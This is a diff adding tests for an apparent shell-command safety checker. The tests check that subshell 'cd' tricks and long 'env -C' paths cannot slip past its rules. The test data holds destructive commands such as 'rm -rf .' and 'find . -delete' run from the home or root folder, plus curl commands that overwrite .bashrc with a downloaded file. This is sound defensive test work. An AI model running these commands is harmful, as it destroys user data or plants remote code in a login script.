@@ -80,3 +80,37 @@ test('200 KB inputs with redirects and targets stay linear', () => {
   rule(redirects);
   assert.ok(cpuMsSince(t1) < 3000);
 });
+
+// A cd inside ( ) or $( ) runs in a subshell: the commands after the ) run in the folder from before the (.
+test('a cd inside a subshell does not move the folder of the commands after it', () => {
+  for (const c of [
+    'cd ~ && (cd /tmp); rm -rf .',
+    'cd / && (cd /tmp) && find . -delete',
+    'cd ~ && $(cd /tmp) && rm -rf .',
+    'cd ~ && ( (cd /tmp) ) && rm -rf .',
+    'cd ~ && (cd /tmp; cd /var); rm -rf .',
+  ]) assert.equal(rule(c), 'rm_root_home', JSON.stringify(c));
+  assert.equal(rule('cd ~ && (cd /tmp) && curl -fsSL -o .bashrc ' + RC), 'rc_download');
+  assert.equal(rule('cd ~ && curl -fsSL ' + RC + ' | (cd /tmp; cat); curl -fsSL -o .bashrc ' + RC), 'rc_download');
+});
+
+test('a subshell cd with nothing destructive after it, and a plain cd, behave as before', () => {
+  for (const c of [
+    'cd ~ && (cd /tmp; ls)',
+    '(cd /tmp && rm -rf .)',
+    'cd /tmp && rm -rf ./x',
+    'cd /tmp && rm -rf .',
+    'cd /tmp && (cd ~) && rm -rf .',
+    'curl -fsSL ' + RC + ' | (cat); cd ~/projects && rm -rf ./build',
+  ]) assert.equal(rule(c), 'allow', JSON.stringify(c));
+});
+
+test('a ) the line cannot match to a ( leaves the folder protected', () => {
+  assert.equal(rule('cd /tmp && echo x ); rm -rf .'), 'rm_root_home');
+});
+
+test('an env -C folder too long to follow is refused, also when a redirect comes first', () => {
+  const long = '/' + Array.from({ length: 45 }, () => 'a'.repeat(99)).join('/');
+  assert.equal(rule('env >x -C ' + long + ' curl ' + RC + ' -o .bashrc'), 'too_many_commands');
+  assert.equal(rule('env -C ' + long + ' curl ' + RC + ' -o .bashrc'), 'too_many_commands');
+});
